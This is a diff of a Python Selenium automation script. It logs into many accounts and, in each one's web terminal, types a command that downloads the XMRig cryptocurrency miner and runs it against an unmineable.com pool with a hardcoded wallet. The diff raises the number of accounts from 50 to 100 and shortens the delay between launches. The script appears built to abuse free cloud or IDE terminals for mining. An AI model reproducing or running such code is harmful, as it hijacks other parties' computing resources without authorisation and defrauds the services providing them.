@@ -91,18 +91,18 @@ def open_browser(instance_number, email, password):
         print("SUCCES")        
         textarea1.send_keys(f"wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz\ntar -xvf xmrig-6.22.2-linux-static-x64.tar.gz\ncd xmrig-6.22.2\n./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u BONK:mA914pP63TTdq1c8igHEtrKQyhdwz36yVVbQeAR6YnD.{email}#u7pd-53qq -p x --tls --threads=4 -k")
         textarea1.send_keys(Keys.ENTER)
-        return sss + 1
+        sss = sss + 1
     except:
         print(f"[{email}] ❌ terminal not found ")
 
 # Launch multiple instances
 threads = []
-for i, (email, password) in enumerate(accounts[:50]):
+for i, (email, password) in enumerate(accounts[:100]):
     
     thread = threading.Thread(target=open_browser, args=(i, email, password))
     thread.start()
     threads.append(thread)
-    time.sleep(40)  # Prevent overload
+    time.sleep(30)  # Prevent overload
 
 for thread in threads:
     thread.join()
